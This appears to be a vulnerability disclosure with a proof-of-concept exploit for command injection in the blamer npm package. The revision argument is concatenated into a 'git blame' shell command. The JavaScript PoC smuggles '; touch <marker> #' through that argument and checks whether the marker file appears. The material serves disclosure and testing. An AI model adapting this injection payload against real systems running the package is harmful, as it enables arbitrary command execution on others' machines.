The vulnerability is command injection in `node_modules/blamer/src/vcs/git.js`: the `exec` function builds a shell command via string concatenation of the untrusted `args` (revision) parameter — `'git blame ' + args + ' ' + filename` — with no sanitization, then passes it to Node's `child_process.exec`, which spawns a shell.

```javascript
const path = require("path");
const fs = require("fs");
const os = require("os");
const Blamer = require("./node_modules/blamer/src/index.js");

const marker = path.join(os.tmpdir(), "blamer_pwned_" + Date.now());
const targetFile = __filename; // any existing file works as the "blamed" file

const blamer = new Blamer("git");

// The second argument to blameByFile is concatenated unsanitized into
// `git blame <args> <file>` and executed via child_process.exec (shell:true),
// so shell metacharacters let us inject arbitrary commands.
const maliciousArgs = `-w; touch ${marker} #`;

blamer.blameByFile(targetFile, maliciousArgs)
  .then(() => console.log("blame finished"))
  .catch(() => console.log("blame errored (expected, injected cmd still ran)"))
  .finally(() => {
    console.log("Injection succeeded:", fs.existsSync(marker));
  });
```
